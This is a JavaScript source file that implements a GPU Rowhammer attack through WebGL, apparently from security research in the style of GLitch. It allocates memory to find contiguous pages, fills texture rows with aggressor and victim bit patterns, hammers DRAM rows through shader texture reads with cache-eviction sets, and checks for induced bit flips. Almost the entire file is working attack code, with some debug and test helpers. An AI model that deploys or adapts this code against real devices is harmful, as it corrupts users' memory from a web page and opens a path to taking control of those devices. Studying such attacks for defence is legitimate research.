/**
* Entry point of the exploit
* TODO: optimize the python server to ignore previous kgsl entries
*/
async function glitch() {
    // create gl context
    initGL();
    initFramebuffer();
        
    // Uncomment below to execute the exploit using frida hammering 
    // exploitGlitch();
    // return;
    // Or have it comminded to run the allocation and hammering process.
    
    let allocators = []
    for (let i = 0 ; i < 4 ; i ++) {
        allocatePages(PAGES_PER_MB * 16);
        let allocator0
        if ( i < 2 ) {
            allocator0 = new Allocator(PAGES_PER_MB * 8);
        }
        else {
            allocator0 = new Allocator(PAGES_PER_MB * 48);
        }
        await allocator0._init(0);
        allocators.push(allocator0)
    } 

    // const contPages = mockContPages(10)

    let contPages = []
    for (let alloc of allocators) {
        contPages = contPages.concat(alloc.SearchContPages())
    }
    // contPages = contPages.concat(allocator1.SearchContPages())
    console.log(`++ ${contPages.length} continuous pages found`);
    
    // enable shaders too be used
    shader = new Shader('vertex-shader', 'fragment-shader');
    shader.use();

    let hammered = 0;
    for (let cont of contPages) {
        console.log(`++ Starting Hammering ContBlock ${hammered}`)
        console.log(cont)
        await hammerTime(cont, 0);
        await hammerTime(cont, 16);
        hammered += 1;
    }

    for (let alloc of allocators) {
        alloc.clean()
    }

    // debug with framebuffer (view texture contents)
    // initDebug();
    // gl.drawArrays(gl.TRIANGLES, 0, 6);
    // viewFramebuffer();

    // DEBUG information
    var available_extensions = gl.getSupportedExtensions();
    console.log(available_extensions);
    const ext = gl.getExtension('WEBGL_debug_shaders');
    console.log(ext.getTranslatedShaderSource(shader.vertexShader));
    console.log(ext.getTranslatedShaderSource(shader.fragmentShader));
}

async function hammerTime(contMem, _row) {
    // example for hammering first bank x=hammer, .=eviction
    //  0001 0203 0405 0607 0809 1011 1213 1415
    // |xxxx|----|----|----|----|----|----|----|
    //  1617 1819 2021 2223 2425 2627 2829 3031
    // |----|----|----|----|----|----|----|----|
    //  3233 3435 3637 3839 4041 4243 4445 4647
    // |xxxx|----|----|----|----|----|----|----|
    //  4849 5051 5253 5455 5657 5859 6061 6263
    // |----|----|----|----|----|--..|....|....|


    // fill textures for hammering
    let row = _row
    for (let localOffset = 0; localOffset < 16; localOffset += 2) {
        let offset = row + localOffset;
        // fill textures in row n-1, n+1 with 0
        // TODO: only necessary when hammering row 1
        fillTexture(contMem[offset + 0].texture, 0x00);
        fillTexture(contMem[offset + 1].texture, 0x00);

        fillTexture(contMem[offset + 32].texture, 0x00);
        fillTexture(contMem[offset + 33].texture, 0x00);
        // console.log(`++ Filled textures with 0 [${offset + 0}] [${offset + 1}] [${offset + 32}] [${offset + 33}]`);

        // fill textures in row n with 1
        fillTexture(contMem[offset + 16].texture, 0xFF);
        fillTexture(contMem[offset + 17].texture, 0xFF);
        // console.log(`++ Filled textures with 1 [${offset + 16}] [${offset + 17}]`);

        // Check texture 
        // let aggressor = await readPtr(contMem[offset + 0].v_addr)
        // let hammer = await readPtr(contMem[offset + 16].v_addr)
        // let hammer1 = await readPtr(contMem[offset + 17].v_addr)
        // console.info(`CHECK ++ aggressor ${aggressor.val} | hammer ${hammer.val} ${hammer1.val}`)
        // if (aggressor.val != 0 || hammer.val != 255 || hammer1.val != 255) {
        //     console.warn('sth is wrong here...')
        // }
    }

    // WebGL2 has some strange asynchronous behaviour
    gl.finish()

    // hammer row 0 and row 1
    console.log(`++ Prepare row [${row/16}] for hammer.`);

    // hammer every bank in a row
    for (let localOffset = 0; localOffset < 16; localOffset += 2) {
        let offset = row + localOffset;
        // console.log(`+++ Prepare bank [${offset}] [${offset + 1}]`);
        
        // Uniforms as debug tool
        // shader.setInt('bank0', offset);
        // shader.setInt('bank1', offset + 1);

        // pass hammer textures according to hammer pattern: jump to differnet row to trigger row buffer when hammering
        shader.bindTexture(contMem[offset + 0].texture, 0, 'H', offset + 0);
        shader.bindTexture(contMem[offset + 32].texture, 2, 'H', offset + 32);
        shader.bindTexture(contMem[offset + 1].texture, 4, 'H', offset + 1);
        shader.bindTexture(contMem[offset + 33].texture, 6, 'H', offset + 33);
    
        // select 5 textures for eviction
        if (row >= 16) {
            if (localOffset < 8) {
                // take 5 textures from end of first row: 11,12,13,14,15
                for (let i = 0; i < 5; i++) {
                    shader.bindTexture(contMem[11 + i].texture, i == 4 ? 8 : i*2+1, 'H', 11 + i);
                }
            } else {
                // take 5 textures from beginning of first row: 0,1,2,3,4
                for (let i = 0; i < 5; i++) {
                    shader.bindTexture(contMem[i].texture, i == 4 ? 8 : i*2+1, 'H', i);
                }
            }
        } else {
            if (localOffset < 8) {
                // take 5 textures from end of last row: 59,60,61,62,63
                for (let i = 0; i < 5; i++) {
                    shader.bindTexture(contMem[59 + i].texture, i == 4 ? 8 : i*2+1, 'H', 59 + i);
                }
            } else {
                // take 5 textures from beginning of last row: 48,49,50,51,52
                for (let i = 0; i < 5; i++) {
                    shader.bindTexture(contMem[48 + i].texture, i == 4 ? 8 : i*2+1, 'H', 48 + i);
                }
            }
        }

        // hammer textures
        // console.log(`+++ Hammering bank [${offset}] [${offset + 1}]`);
        gl.finish()
        gl.drawArrays(gl.POINTS, 0, 1);
        gl.finish()
        // console.log(`+++ Hammering bank [${offset}] [${offset + 1}] done`);
        // Debug with framebuffer - initDebug needs to be called before
        // gl.drawArrays(gl.TRIANGLES, 0, 6);
        // viewFramebuffer();

        checkForFlip(contMem[offset + 16].texture);
        checkForFlip(contMem[offset + 17].texture);
        // doubleCheckForFlip(contMem[offset + 16]);
        // doubleCheckForFlip(contMem[offset + 17]);
        // console.log(`++ Checked [${offset + 16}] [${offset + 17}] for bitflips.`);
    }

    return Promise.resolve(1)
}

function prepareHammerTimeTests() {
    // TODO: this is only for testing purposes
    const textures = [];
    for(let i=0; i<9; i++) {
        const t = createTexture2DRGBA(createUint8Array(KB4, 20+i), PAGE_TEXTURE_W, PAGE_TEXTURE_H);
        textures.push(t);
    }

    fillTexture(textures[0], 0x00);
    fillTexture(textures[1], 0xFF);
    fillTexture(textures[2], 0x0F);
    
    shader.bindTexture(textures[8], 8, 'H', 8);
    shader.bindTexture(textures[5], 5, 'H', 5);
    shader.bindTexture(textures[0], 0, 'H', 0);
    shader.bindTexture(textures[4], 4, 'H', 4);
    shader.bindTexture(textures[1], 1, 'H', 1);
    shader.bindTexture(textures[2], 2, 'H', 2);
    shader.bindTexture(textures[6], 6, 'H', 6);
    shader.bindTexture(textures[3], 3, 'H', 3);
    shader.bindTexture(textures[7], 7, 'H', 7);
    
    checkForFlip(textures[2]);
    checkForFlip(textures[1]);
    checkForFlip(textures[8]);
}

async function testAllocator() {
    const allocationPages = 4
    let safeAllocator = new Allocator(allocationPages)
    await safeAllocator._init(1)

    let allocator = new Allocator(allocationPages)
    await allocator._init(0)

    console.log(allocator.newKGSL)
    console.log(allocator.newKGSLSafe)
    allocator.clean()
    safeAllocator.clean()
}
